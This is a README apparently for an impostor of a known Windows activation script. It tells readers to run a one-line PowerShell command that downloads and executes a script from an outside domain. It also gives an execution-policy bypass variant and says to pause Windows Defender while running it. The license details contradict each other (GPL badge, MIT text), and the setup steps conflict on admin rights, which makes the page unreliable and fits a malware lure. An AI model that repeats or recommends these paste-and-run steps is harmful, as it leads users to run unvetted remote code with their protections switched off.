<div align="center">

# MassGravel Activation Portal — Web Application

![preview](https://raw.githubusercontent.com/mhilali260-glitch/responsive-web-hub/main/banner_cc61.svg)

[![pwsh](https://img.shields.io/badge/PWSH-5%2B-84cc16?style=plastic&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-GPL--3.0-a3e635?style=plastic&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-PRODUCTION-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

This repository powers the get.activated.win site, delivering a streamlined, reliable entry point for the loader script that users depend on. Every component is built to keep the experience fast, clear, and consistent from first visit to execution. Contributions are welcome and help shape the ongoing development of the project.

## 🔧 PowerShell Setup

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Execute the setup script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Instant Activation Utility:** A lightweight loader experience designed to get users up and running quickly, with a single entry point that handles the heavy lifting behind the scenes.
- **One-Line Execution Flow:** A streamlined interface that keeps the process simple and approachable—no complex setup rituals, no unnecessary steps.
- **Clean, Focused Landing Experience:** A polished site built to communicate clearly and guide visitors toward the utility with minimal friction.
- **Open Collaboration Model:** The project welcomes community involvement, making it easy for contributors to propose improvements, report issues, and help shape the direction of the platform.
- **Transparent, Maintainable Foundation:** A straightforward repository structure built for clarity, so the project stays easy to review, extend, and maintain over time.
- **Accessible Anywhere:** A web-first approach that delivers the experience consistently across modern browsers without requiring a local installation.

## Tech Stack

Built on a modern, performance-first foundation, this site pairs a lean static architecture with a component-driven front end so every page loads fast and stays effortless to maintain.

- **Static-first delivery** — Pre-rendered pages ship straight to the edge, keeping load times snappy and hosting simple.
- **Component-based UI** — A modular front-end framework keeps layouts consistent and makes new sections easy to compose.
- **Utility-first styling** — A token-driven CSS approach delivers a polished, responsive look across every screen size.
- **Markdown-powered content** — Documentation and copy live in plain text files, so contributions stay approachable and diffs stay clean.
- **Automated builds and deploys** — Continuous integration validates every change and publishes updates the moment they land.
- **Lightweight by design** — Minimal dependencies and optimized assets keep the experience fast on any connection.

## Contributing

Contributions are what keep this project sharp, current, and genuinely useful for everyone who relies on it. Whether you're fixing a typo, refining the site experience, or proposing a meaningful improvement, your effort helps shape a product that people trust.

Here's how you can make an impact:

- **Report issues with context.** If something looks off or behaves unexpectedly, open an issue with clear steps to reproduce and any relevant details. Well-documented reports are the fastest path to a fix.
- **Propose enhancements.** Have an idea that would make the site more intuitive, more reliable, or simply better? Share it. Thoughtful proposals are always welcome and reviewed with care.
- **Submit focused changes.** Small, well-scoped pull requests are easier to review and merge. Keep each contribution centered on a single concern, and describe the reasoning behind it.
- **Respect the project's direction.** This site is built with intention. Align your changes with existing patterns and conventions so the experience stays consistent and polished for every visitor.
- **Be constructive and collaborative.** Every contribution is a conversation. Assume good intent, welcome feedback, and help maintain a welcoming environment for contributors of all experience levels.

Before you dive in, take a moment to review the project's existing documentation and open discussions. Understanding the current landscape helps your contribution land smoothly and strengthens the overall product.

Your time and expertise are valued here. Thank you for helping make this project better.

## License

This project is released under the MIT License, giving you the freedom to use, modify, and distribute the code with minimal restrictions. Whether you're exploring the codebase, adapting it for your own needs, or building something new on top of it, the license keeps things simple and permissive. Commercial and personal use are both welcome, provided the original copyright and license notice are preserved. For complete terms and conditions, refer to the LICENSE file included in this repository.